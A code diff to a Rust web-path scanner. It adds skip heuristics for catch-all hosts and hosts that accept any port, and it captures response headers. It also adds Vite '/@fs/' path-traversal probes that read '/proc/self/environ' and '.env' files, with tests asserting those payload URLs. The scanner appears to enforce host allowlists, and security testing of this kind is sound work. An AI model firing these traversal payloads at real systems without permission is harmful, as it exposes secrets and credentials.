@@ -2,31 +2,34 @@ use std::{
     cmp::Ordering,
     collections::{BinaryHeap, HashMap, HashSet},
     env,
+    hash::{Hash, Hasher},
     sync::Arc,
     time::{Duration, SystemTime, UNIX_EPOCH},
 };
 
 use crate::{
     config::{
-        resolve_scan_proxy_url, AppConfig, GobusterConfig, InventoryConfig, ProxyMode, ScanConfig,
+        AppConfig, GobusterConfig, InventoryConfig, ProxyMode, ScanConfig, resolve_scan_proxy_url,
     },
     core::{
-        merge_coverage_source_stat, merge_coverage_source_stats, normalize_request_profile_name,
-        sanitize_paths, sort_coverage_source_stats, FetchTelemetry, GobusterTargetConfig,
-        TargetRecord,
+        FetchTelemetry, GobusterTargetConfig, TargetRecord, merge_coverage_source_stat,
+        merge_coverage_source_stats, normalize_request_profile_name, sanitize_paths,
+        sort_coverage_source_stats,
     },
 };
-use anyhow::{anyhow, Context, Result};
+use anyhow::{Context, Result, anyhow};
 use futures::stream::{FuturesUnordered, StreamExt};
 use once_cell::sync::Lazy;
 use regex::Regex;
-use reqwest::{header, redirect, Client, Proxy, RequestBuilder};
+use reqwest::{Client, Proxy, RequestBuilder, header, redirect};
 use serde_json::Value;
 use sha2::{Digest, Sha256};
 use tokio::{
+    net::{TcpStream, lookup_host},
     sync::{Mutex, OwnedSemaphorePermit, Semaphore},
     time::Instant,
 };
+use tracing::info;
 use url::Url;
 
 #[derive(Debug, Clone)]
@@ -35,6 +38,7 @@ pub struct FetchedDocument {
     pub url: String,
     pub status: u16,
     pub content_type: Option<String>,
+    pub headers: Vec<(String, String)>,
     pub body: String,
     pub truncated: bool,
     pub coverage_source: String,
@@ -193,6 +197,9 @@ const AUTHORITATIVE_DISCOVERY_MIN_COVERAGE_SCORE: u16 = 560;
 const MAX_OPENAPI_ROUTE_CANDIDATES: usize = 24;
 const MAX_ADAPTIVE_PREFIXES: usize = 6;
 const MAX_ADAPTIVE_CANDIDATES: usize = 20;
+const HIGH_PORT_SKIP_PROBE_START: u16 = 40_000;
+const HIGH_PORT_SKIP_PROBE_END: u16 = 50_000;
+const HIGH_PORT_SKIP_PROBE_TIMEOUT: Duration = Duration::from_millis(800);
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum DiscoveryNormalizationPolicy {
@@ -361,6 +368,64 @@ impl Fetcher {
             .with_context(|| format!("invalid target URL {}", target.base_url))?;
 
         let mut report = TargetFetchReport::default();
+
+        if let Some(port) = self.detect_listens_on_everything(&base_url, target).await {
+            let host_hash = hashed_target_host_identifier(&base_url);
+            info!(
+                host_hash = %host_hash,
+                heuristic = "high_port_tcp_accept",
+                probe_port = port,
+                "skipping host after random high-port listener heuristic"
+            );
+            report.errors.push(format!(
+                "host skipped: host hash {host_hash} accepted random high-port TCP probe {port}; host appears to listen on everything",
+            ));
+            return Ok(report);
+        }
+
+        let control_probe_path = build_control_probe_path(target);
+        let control_baseline = self
+            .fetch_path(
+                base_url.clone(),
+                control_probe_path.clone(),
+                true,
+                String::new(),
+                Arc::clone(&request_profile),
+            )
+            .await;
+        merge_fetch_telemetry(&mut report.telemetry, &control_baseline.telemetry);
+        let (control_similarity_key, control_baseline_signature) = match control_baseline.result {
+            Ok(snapshot) => {
+                if control_probe_indicates_catch_all(&snapshot.document) {
+                    let host_hash = hashed_target_host_identifier(&base_url);
+                    info!(
+                        host_hash = %host_hash,
+                        heuristic = "http_200_control_probe",
+                        probe_path = %control_probe_path,
+                        "skipping host after catch-all control probe heuristic"
+                    );
+                    report.telemetry.control_match_responses += 1;
+                    report.errors.push(format!(
+                        "host skipped: host hash {host_hash} returned HTTP 200 for control probe {control_probe_path}; host appears to be a catch-all",
+                    ));
+                    return Ok(report);
+                }
+                (
+                    snapshot.similarity_key.clone(),
+                    Some(ResponseBaseline {
+                        status: snapshot.document.status,
+                        body_len: snapshot.document.body.len(),
+                    }),
+                )
+            }
+            Err(error) => {
+                report
+                    .errors
+                    .push(format!("control probe {}: {error}", control_probe_path));
+                (None, None)
+            }
+        };
+
         let max_paths_per_target = self.scan.max_paths_per_target.max(1);
         let max_parallel_paths_per_target = self
             .scan
@@ -393,33 +458,6 @@ impl Fetcher {
                 );
             }
         }
-
-        let control_probe_path = build_control_probe_path(target);
-        let control_baseline = self
-            .fetch_path(
-                base_url.clone(),
-                control_probe_path.clone(),
-                true,
-                String::new(),
-                Arc::clone(&request_profile),
-            )
-            .await;
-        merge_fetch_telemetry(&mut report.telemetry, &control_baseline.telemetry);
-        let (control_similarity_key, control_baseline_signature) = match control_baseline.result {
-            Ok(snapshot) => (
-                snapshot.similarity_key.clone(),
-                Some(ResponseBaseline {
-                    status: snapshot.document.status,
-                    body_len: snapshot.document.body.len(),
-                }),
-            ),
-            Err(error) => {
-                report
-                    .errors
-                    .push(format!("control probe {}: {error}", control_probe_path));
-                (None, None)
-            }
-        };
 
         let mut seen_responses = HashSet::new();
         let mut completed_paths = 0usize;
@@ -594,10 +632,7 @@ impl Fetcher {
         }
 
         let result: Result<ResponseSnapshot> = async {
-            let relative = path.trim_start_matches('/');
-            let url = base_url
-                .join(relative)
-                .with_context(|| format!("failed to join path {path} to {base_url}"))?;
+            let url = build_target_fetch_url(&base_url, &path)?;
             let host_throttle = self.host_throttle_for_url(&url).await;
             let _host_permit = host_throttle.acquire().await?;
             host_throttle.wait_until_ready().await;
@@ -640,6 +675,16 @@ impl Fetcher {
                     .get(reqwest::header::CONTENT_TYPE)
                     .and_then(|value| value.to_str().ok())
                     .map(|value| value.to_string());
+                let headers = response
+                    .headers()
+                    .iter()
+                    .filter_map(|(name, value)| {
+                        value
+                            .to_str()
+                            .ok()
+                            .map(|value| (name.as_str().to_string(), value.to_string()))
+                    })
+                    .collect::<Vec<_>>();
                 let (body, truncated) =
                     match read_response_body(&mut response, self.scan.max_response_bytes).await {
                         Ok(result) => result,
@@ -672,6 +717,7 @@ impl Fetcher {
                         url: url.to_string(),
                         status,
                         content_type: content_type.clone(),
+                        headers,
                         body,
                         truncated,
                         coverage_source: coverage_source.clone(),
@@ -840,6 +886,37 @@ impl Fetcher {
         }
 
         Ok(resolved)
+    }
+
+    async fn detect_listens_on_everything(
+        &self,
+        base_url: &Url,
+        target: &TargetRecord,
+    ) -> Option<u16> {
+        if !self
+            .transport_attempts()
+            .iter()
+            .any(|transport| matches!(transport, FetchTransport::Direct))
+        {
+            return None;
+        }
+
+        let host = base_url.host_str()?;
+        let probe_port = random_high_port_probe(target, base_url);
+        let Ok(addresses) = lookup_host((host, probe_port)).await else {
+            return None;
+        };
+
+        for address in addresses {
+            match tokio::time::timeout(HIGH_PORT_SKIP_PROBE_TIMEOUT, TcpStream::connect(address))
+                .await
+            {
+                Ok(Ok(_stream)) => return Some(probe_port),
+                Ok(Err(_)) | Err(_) => continue,
+            }
+        }
+
+        None
     }
 
     fn ensure_target_allowed(&self, target: &TargetRecord) -> Result<()> {
@@ -1041,6 +1118,37 @@ fn build_control_probe_path(target: &TargetRecord) -> String {
         target.id.max(0),
         target.paths.len()
     )
+}
+
+fn control_probe_indicates_catch_all(document: &FetchedDocument) -> bool {
+    document.status == 200
+}
+
+fn random_high_port_probe(target: &TargetRecord, base_url: &Url) -> u16 {
+    let mut hasher = std::collections::hash_map::DefaultHasher::new();
+    target.id.hash(&mut hasher);
+    target.base_url.hash(&mut hasher);
+    target.label.hash(&mut hasher);
+    base_url.scheme().hash(&mut hasher);
+    base_url.host_str().unwrap_or_default().hash(&mut hasher);
+    let span = u64::from(HIGH_PORT_SKIP_PROBE_END - HIGH_PORT_SKIP_PROBE_START) + 1;
+    let offset = hasher.finish() % span;
+    HIGH_PORT_SKIP_PROBE_START + offset as u16
+}
+
+fn hashed_target_host_identifier(base_url: &Url) -> String {
+    let port = base_url.port_or_known_default().unwrap_or_default();
+    let token = format!(
+        "{}://{}:{}",
+        base_url.scheme(),
+        base_url.host_str().unwrap_or_default().to_ascii_lowercase(),
+        port
+    );
+    let digest = Sha256::digest(token.as_bytes());
+    digest[..8]
+        .iter()
+        .map(|byte| format!("{byte:02x}"))
+        .collect::<String>()
 }
 
 fn enqueue_frontier_path(
@@ -1996,6 +2104,9 @@ fn path_coverage_score(path: &str) -> u16 {
     if lowered.ends_with(".env") || lowered.contains("/.env") {
         score = score.max(920);
     }
+    if lowered.starts_with("/@fs/") && (lowered.contains(".env") || lowered.contains("environ")) {
+        score = score.max(945);
+    }
     if lowered.ends_with("manifest.json") || lowered.ends_with(".webmanifest") {
         score = score.max(880);
     }
@@ -2212,6 +2323,9 @@ fn semantic_document_candidates(current_path: &str, body: &str) -> Vec<Discovery
             "vite-source-map",
             800,
         );
+        for (path, score) in vite_fs_probe_hints() {
+            push_unique_hint(&mut candidates, path.to_string(), "vite-fs-raw", score);
+        }
     }
 
     if lowered_body.contains("asset-manifest") || lowered_body.contains("webpack") {
@@ -3150,11 +3264,7 @@ fn path_directory(path: &str) -> &str {
 
     let without_trailing = trimmed.trim_end_matches('/');
     if let Some((directory, _)) = without_trailing.rsplit_once('/') {
-        if directory.is_empty() {
-            "/"
-        } else {
-            directory
-        }
+        if directory.is_empty() { "/" } else { directory }
     } else {
         "/"
     }
@@ -3182,6 +3292,20 @@ fn push_unique_hint(
         source,
         score,
     });
+}
+
+fn vite_fs_probe_hints() -> [(&'static str, u16); 6] {
+    [
+        ("/@fs//proc/self/environ?raw", 965),
+        ("/@fs//proc/1/environ?raw", 945),
+        ("/@fs/..%2f..%2f..%2f..%2fproc/self/environ?raw", 960),
+        (
+            "/@fs/..%2f..%2f..%2f..%2f..%2f..%2fproc/self/environ?raw",
+            955,
+        ),
+        ("/@fs/..%2f..%2f..%2f..%2f.env?raw", 950),
+        ("/@fs/..%2f..%2f..%2f..%2f..%2f..%2f.env?raw", 945),
+    ]
 }
 
 fn push_discovered_candidate(
@@ -3284,6 +3408,7 @@ fn authoritative_discovered_score_floor(source: &str) -> u16 {
         "web-manifest" | "json-manifest-path" => 540,
         "asset-manifest" => 555,
         "vite-manifest" => 555,
+        "vite-fs-raw" => 930,
         "next-manifest" => 555,
         "openapi-route" => 640,
         _ => 0,
@@ -3312,6 +3437,10 @@ fn normalize_discovered_path(
         return None;
     }
 
+    if is_verbatim_discovered_candidate(candidate) {
+        return normalize_verbatim_discovered_path(candidate, policy);
+    }
+
     let current_url = base_url.join(current_path.trim_start_matches('/')).ok()?;
     let mut resolved = current_url.join(candidate).ok()?;
     if !same_origin(base_url, &resolved) {
@@ -3333,6 +3462,54 @@ fn normalize_discovered_path(
     Some(path)
 }
 
+fn is_verbatim_discovered_candidate(candidate: &str) -> bool {
+    let lowered = candidate.trim().to_ascii_lowercase();
+    lowered.starts_with("/@fs/") && lowered.contains("?raw")
+}
+
+fn normalize_verbatim_discovered_path(
+    candidate: &str,
+    policy: DiscoveryNormalizationPolicy,
+) -> Option<String> {
+    let candidate = candidate.trim();
+    let (path_part, query_part) = candidate.split_once('?').unwrap_or((candidate, ""));
+    let path = sanitize_paths(&[path_part.to_string()])
+        .into_iter()
+        .next()?;
+    if !(is_interesting_discovered_path(&path)
+        || matches!(policy, DiscoveryNormalizationPolicy::Authoritative)
+            && is_authoritative_route_like_path(&path))
+    {
+        return None;
+    }
+
+    if query_part.is_empty() {
+        Some(path)
+    } else {
+        Some(format!("{path}?{query_part}"))
+    }
+}
+
+fn build_target_fetch_url(base_url: &Url, path: &str) -> Result<Url> {
+    let candidate = path.trim();
+    if candidate.is_empty() {
+        return Err(anyhow!("path is required"));
+    }
+
+    let normalized = if candidate.starts_with('/') {
+        candidate.to_string()
+    } else {
+        format!("/{candidate}")
+    };
+    let mut origin = base_url.clone();
+    origin.set_path("/");
+    origin.set_query(None);
+    origin.set_fragment(None);
+    let origin_prefix = origin.as_str().trim_end_matches('/');
+    Url::parse(&format!("{origin_prefix}{normalized}"))
+        .with_context(|| format!("failed to join path {path} to {base_url}"))
+}
+
 fn same_origin(left: &Url, right: &Url) -> bool {
     left.scheme().eq_ignore_ascii_case(right.scheme())
         && left
@@ -3347,6 +3524,10 @@ fn is_interesting_discovered_path(path: &str) -> bool {
     let lowered = path.trim().to_ascii_lowercase();
     if lowered.is_empty() || lowered == "/" {
         return false;
+    }
+
+    if lowered.starts_with("/@fs/") && (lowered.contains(".env") || lowered.contains("environ")) {
+        return true;
     }
 
     if lowered.starts_with("/.well-known/")
@@ -3523,21 +3704,22 @@ mod tests {
     use std::{
         future::Future,
         sync::{
-            atomic::{AtomicUsize, Ordering},
             Arc,
+            atomic::{AtomicUsize, Ordering},
         },
         time::{Duration, Instant},
     };
 
+    use super::build_target_fetch_url;
     use axum::{
+        Router,
         extract::{Path, State},
         http::{
-            header::{self, CONTENT_TYPE},
             HeaderMap, StatusCode,
+            header::{self, CONTENT_TYPE},
         },
         response::Html,
         routing::get,
-        Router,
     };
     use chrono::Utc;
     use once_cell::sync::Lazy;
@@ -3545,8 +3727,8 @@ mod tests {
     use url::Url;
 
     use super::{
-        build_gobuster_word_candidates, discover_candidate_path_candidates,
-        discover_candidate_paths, response_similarity_key, Fetcher,
+        Fetcher, build_gobuster_word_candidates, discover_candidate_path_candidates,
+        discover_candidate_paths, response_similarity_key,
     };
     use crate::{
         config::{AppConfig, ProxyMode, RequestProfileConfig, RequestProfileSecretRef},
@@ -3823,8 +4005,8 @@ mod tests {
         request_times: Arc<Mutex<Vec<(String, Instant)>>>,
     }
 
-    async fn spawn_backoff_test_server(
-    ) -> (JoinHandle<()>, String, Arc<Mutex<Vec<(String, Instant)>>>) {
+    async fn spawn_backoff_test_server()
+    -> (JoinHandle<()>, String, Arc<Mutex<Vec<(String, Instant)>>>) {
         async fn catch_all(
             State(probe): State<BackoffProbe>,
             Path(path): Path<String>,
@@ -3909,6 +4091,34 @@ mod tests {
         (handle, format!("http://{}", address))
     }
 
+    async fn spawn_http_200_catch_all_server() -> (JoinHandle<()>, String) {
+        async fn catch_all() -> (StatusCode, [(&'static str, &'static str); 1], &'static str) {
+            (
+                StatusCode::OK,
+                [("content-type", "text/plain")],
+                "catch-all-ok",
+            )
+        }
+
+        let app = Router::new()
+            .route("/", get(catch_all))
+            .route("/{*path}", get(catch_all));
+
+        let listener = TcpListener::bind("127.0.0.1:0")
+            .await
+            .expect("catch-all listener should bind");
+        let address = listener
+            .local_addr()
+            .expect("catch-all listener should report local addr");
+        let handle = tokio::spawn(async move {
+            axum::serve(listener, app)
+                .await
+                .expect("catch-all server should stay available")
+        });
+
+        (handle, format!("http://{}", address))
+    }
+
     fn record_max_parallelism(max_value: &AtomicUsize, candidate: usize) {
         let mut observed = max_value.load(Ordering::SeqCst);
         while candidate > observed {
@@ -3961,7 +4171,30 @@ mod tests {
         assert!(discovered.contains(&"/runtime-config.json".to_string()));
         assert!(discovered.contains(&"/runtime-config.js".to_string()));
         assert!(discovered.contains(&"/vite.manifest.json".to_string()));
+        assert!(discovered.contains(&"/@fs//proc/self/environ?raw".to_string()));
+        assert!(discovered.contains(&"/@fs/..%2f..%2f..%2f..%2f.env?raw".to_string()));
         assert!(discovered.contains(&"/_next/build-manifest.json".to_string()));
+    }
+
+    #[test]
+    fn build_target_fetch_url_preserves_vite_fs_probe_paths() {
+        let base_url =
+            Url::parse("https://app.example.com/dashboard").expect("base url should parse");
+
+        let traversal =
+            build_target_fetch_url(&base_url, "/@fs/..%2f..%2f..%2f..%2fproc/self/environ?raw")
+                .expect("vite traversal url should build");
+        assert_eq!(
+            traversal.as_str(),
+            "https://app.example.com/@fs/..%2f..%2f..%2f..%2fproc/self/environ?raw"
+        );
+
+        let absolute = build_target_fetch_url(&base_url, "/@fs//proc/self/environ?raw")
+            .expect("vite absolute @fs url should build");
+        assert_eq!(
+            absolute.as_str(),
+            "https://app.example.com/@fs//proc/self/environ?raw"
+        );
     }
 
     #[test]
@@ -4230,9 +4463,11 @@ paths:
             .fetch_target(&target)
             .await
             .expect_err("disallowed target port should fail fast");
-        assert!(error
-            .to_string()
-            .contains("outside configured inventory host and port allowlists"));
+        assert!(
+            error
+                .to_string()
+                .contains("outside configured inventory host and port allowlists")
+        );
 
         server.abort();
     }
@@ -4313,10 +4548,12 @@ paths:
                 .and_then(|value| value.to_str().ok()),
             Some("custom-header-value")
         );
-        assert!(auth_request
-            .get(axum::http::header::COOKIE)
-            .and_then(|value| value.to_str().ok())
-            .is_some_and(|cookie| cookie.contains("session_cookie=session-value")));
+        assert!(
+            auth_request
+                .get(axum::http::header::COOKIE)
+                .and_then(|value| value.to_str().ok())
+                .is_some_and(|cookie| cookie.contains("session_cookie=session-value"))
+        );
 
         drop(captured);
         server.abort();
@@ -4901,6 +5138,130 @@ paths:
             coverage_source_stat(&report.telemetry.coverage_sources, "gobuster-wordlist")
                 .queued_paths
                 >= 2
+        );
+
+        server.abort();
+    }
+
+    #[tokio::test]
+    async fn fetch_target_skips_host_that_accepts_random_high_port_probe() {
+        let (server, base_url) = spawn_fetcher_test_server().await;
+        let mut config = AppConfig::default();
+        config.inventory.allowed_host_suffixes = vec!["127.0.0.1".to_string()];
+        config.scan.max_paths_per_target = 2;
+        config.scan.enable_path_discovery = false;
+        let fetcher = Fetcher::new(&config).expect("fetcher should build");
+
+        let mut bound_listener = None;
+        let mut target = None;
+        for target_id in 1000..1200 {
+            let candidate = TargetRecord {
+                id: target_id,
+                label: format!("high-port-skip-{target_id}"),
+                base_url: base_url.clone(),
+                paths: vec!["/".to_string()],
+                tags: Vec::new(),
+                request_profile: None,
+                gobuster: Default::default(),
+                strategy: TargetStrategy::Hybrid,
+                discovery_provenance: Vec::new(),
+                enabled: true,
+                created_at: Utc::now(),
+                updated_at: Utc::now(),
+            };
+            let url = Url::parse(&candidate.base_url).expect("base url should parse");
+            let probe_port = super::random_high_port_probe(&candidate, &url);
+            match TcpListener::bind(("127.0.0.1", probe_port)).await {
+                Ok(listener) => {
+                    bound_listener = Some(listener);
+                    target = Some(candidate);
+                    break;
+                }
+                Err(_) => continue,
+            }
+        }
+
+        let listener = bound_listener.expect("expected a bindable probe port");
+        let target = target.expect("expected a target using the probe port");
+        let report = fetcher
+            .fetch_target(&target)
+            .await
+            .expect("skip heuristic should return a report");
+
+        assert!(report.documents.is_empty());
+        assert_eq!(report.telemetry.request_count, 0);
+        assert!(
+            report
+                .errors
+                .iter()
+                .any(|error| error.contains("host appears to listen on everything"))
+        );
+        assert!(
+            report
+                .errors
+                .iter()
+                .all(|error| !error.contains(&target.base_url))
+        );
+        assert!(
+            report
+                .errors
+                .iter()
+                .any(|error| error.contains("host hash "))
+        );
+
+        drop(listener);
+        server.abort();
+    }
+
+    #[tokio::test]
+    async fn fetch_target_skips_http_200_catch_all_hosts() {
+        let (server, base_url) = spawn_http_200_catch_all_server().await;
+        let mut config = AppConfig::default();
+        config.inventory.allowed_host_suffixes = vec!["127.0.0.1".to_string()];
+        config.scan.max_paths_per_target = 2;
+        config.scan.enable_path_discovery = false;
+        let fetcher = Fetcher::new(&config).expect("fetcher should build");
+        let target = TargetRecord {
+            id: 73,
+            label: "catch-all-200".to_string(),
+            base_url,
+            paths: vec!["/".to_string()],
+            tags: Vec::new(),
+            request_profile: None,
+            gobuster: Default::default(),
+            strategy: TargetStrategy::Hybrid,
+            discovery_provenance: Vec::new(),
+            enabled: true,
+            created_at: Utc::now(),
+            updated_at: Utc::now(),
+        };
+
+        let report = fetcher
+            .fetch_target(&target)
+            .await
+            .expect("catch-all heuristic should return a report");
+
+        assert!(report.documents.is_empty());
+        assert_eq!(report.telemetry.request_count, 1);
+        assert_eq!(report.telemetry.control_requests, 1);
+        assert_eq!(report.telemetry.control_match_responses, 1);
+        assert!(
+            report
+                .errors
+                .iter()
+                .any(|error| error.contains("host appears to be a catch-all"))
+        );
+        assert!(
+            report
+                .errors
+                .iter()
+                .all(|error| !error.contains(&target.base_url))
+        );
+        assert!(
+            report
+                .errors
+                .iter()
+                .any(|error| error.contains("host hash "))
         );
 
         server.abort();
